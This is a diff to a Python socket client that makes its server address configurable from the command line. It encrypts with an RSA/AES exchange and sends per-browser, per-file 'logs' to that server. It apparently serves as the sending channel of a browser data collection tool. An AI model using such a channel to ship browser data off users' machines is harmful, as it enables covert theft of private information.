@@ -8,13 +8,12 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad
 from Crypto.Random import get_random_bytes
 
-from util.general import FORMAT, BITS_IN_BYTE
+from util.general import FORMAT, BITS_IN_BYTE, get_arguments
 
 
 """ CONSTANTS """
-SERVER_HOST = 'localhost'
-SERVER_PORT = 4813
-SERVER_ADDRESS = (SERVER_HOST, SERVER_PORT)
+DEFAULT_SERVER_HOST = 'localhost'
+DEFAULT_SERVER_PORT = 4813
 
 AES_KEY_SIZE = 128 // BITS_IN_BYTE
 RSA_KEY_LEN_B64 = 600
@@ -46,11 +45,22 @@ def try_socket(socket_function):
 @try_socket
 def socket_initialise() -> None:
     """ Creates socket connection with server """
+    # Check command line arguments for remote status
+    remote_status = get_arguments().remote
+    if remote_status is None:
+        print('No remote specified')
+        return
+    num_args = len(remote_status)
+    server_host = remote_status[0] if num_args >= 1 else DEFAULT_SERVER_HOST
+    server_port = int(remote_status[1]) if num_args >= 2 else DEFAULT_SERVER_PORT
+    server_address = (server_host, server_port)
+    print(f'Trying to connect to {server_address}..')
+
     # Connect to server
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.connect(SERVER_ADDRESS)
+    server.connect(server_address)
     socket_info['server'] = server
-    print(f'[CONNECTED TO SERVER]: {SERVER_ADDRESS}')
+    print(f'[CONNECTED TO SERVER]: {server_address}')
 
     # Get RSA public key from server
     print('===== Starting key exchange =====')
@@ -125,9 +135,10 @@ def socket_send_message(data: dict) -> None:
 
 @try_socket
 def socket_send_log(data: dict, browser_name: str, file_name: str) -> None:
-    """ Send log to socket server """
-    socket_send_message({
-        'browser': browser_name,
-        'type': file_name,
-        'data': data,
-    })
+    """ Send log to socket server if remote argument specified """
+    if socket_info['server']:
+        socket_send_message({
+            'browser': browser_name,
+            'type': file_name,
+            'data': data,
+        })
